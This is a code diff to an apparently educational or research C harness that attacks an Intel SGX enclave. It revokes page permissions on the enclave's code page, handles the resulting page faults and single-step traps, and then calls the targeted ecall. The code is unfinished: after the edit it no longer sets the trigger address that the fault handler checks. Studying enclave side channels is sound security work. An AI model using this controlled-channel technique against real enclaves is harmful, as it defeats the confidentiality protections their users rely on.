@@ -48,23 +48,12 @@ void ocall_print_address(const char *str, uint64_t a)
 {
     info("ocall_print_address: enclave says: '%s' '%p'",str, (void*)a);
 }
-/* ================== ATTACKER IRQ/FAULT HANDLERS ================= */
-
-/* Called before resuming the enclave after an Asynchronous Enclave eXit. */
-void aep_cb_func(void)
-{
-
-   info("aep");
-
-
-
-}
 
 /* Called upon SIGSEGV caused by untrusted page tables. */
 void fault_handler(int signo, siginfo_t * si, void  *ctx)
 {
 
-    info("pf handler");
+    //info("mynameisjef");
 
     ucontext_t *uc = (ucontext_t *) ctx;
 
@@ -73,15 +62,17 @@ void fault_handler(int signo, siginfo_t * si, void  *ctx)
       case SIGSEGV:
         ASSERT(fault_cnt++ < 10);
 
-        info("Caught page fault (base address=%p)", si->si_addr);
-        
+        #if DEBUG
+            info("Caught page fault (base address=%p)", si->si_addr);
+        #endif
     
         if (si->si_addr == trigger_adrs)
         {
-            info("Restoring trigger access rights..");
-            
-            ASSERT(!mprotect(trigger_adrs, 4096, PROT_READ | PROT_EXEC));
-           // do_irq = 1;
+            #if DEBUG
+                info("Restoring trigger access rights..");
+            #endif
+            ASSERT(!mprotect(trigger_adrs, 4096, PROT_READ | PROT_WRITE));
+            do_irq = 1;
 
             #if !DO_TIMER_STEP
                 sgx_step_do_trap = 1;
@@ -96,9 +87,9 @@ void fault_handler(int signo, siginfo_t * si, void  *ctx)
 
     #if !DO_TIMER_STEP
       case SIGTRAP:
-            
-        info("Caught single-step trap (RIP=%p)\n", si->si_addr);
-        
+        #if DEBUG
+            //info("Caught single-step trap (RIP=%p)\n", si->si_addr);
+        #endif
 
         /* ensure RFLAGS.TF is clear to disable debug single-stepping */
         uc->uc_mcontext.gregs[REG_EFL] &= ~0x100;
@@ -148,13 +139,12 @@ void attacker_config_runtime(void)
 void attacker_config_page_table(void)
 {
     code_adrs = get_enclave_base() + get_symbol_offset("ecall_lookup");
-    trigger_adrs = (void *)((size_t)code_adrs & ~(4096 - 1));
+    void* code_page_start = (void *)((size_t)code_adrs & ~(4096 - 1));
 
-
-    info("enclave trigger at %p; code at %p", trigger_adrs, code_adrs);
+    info("code at %p", code_adrs);
 
     
-    ASSERT(!mprotect(trigger_adrs, 4096, PROT_NONE ));
+    ASSERT(!mprotect(code_page_start, 4096, PROT_NONE ));
 
     //VRAAG WAT NOG HIER
     
@@ -169,26 +159,16 @@ int main( int argc, char **argv )
     int rv = 1, secret = 1;
 
      /* 1. Setup attack execution environment. */
-    register_symbols("./Enclave/encl.so");
-    attacker_config_runtime();
-    attacker_config_page_table();
-    register_aep_cb(aep_cb_func);
-
-    register_signal_handler( SIGTRAP );
-    set_debug_optin();
+     register_symbols("./Enclave/encl.so");
+     attacker_config_runtime();
+     attacker_config_page_table();
 
 
 
-    /*
     for(int i = 0; i < 10; i++){
         ecall_increase(eid);
-    }*/
-
-    do_irq = 0; trigger_cnt = 0, irq_cnt = 0, step_cnt = 0, fault_cnt = 0;
-    sgx_step_do_trap = 0;
-
+    }
     ecall_lookup(eid, &rv);
-
 
     printf("%d\n", rv);
     
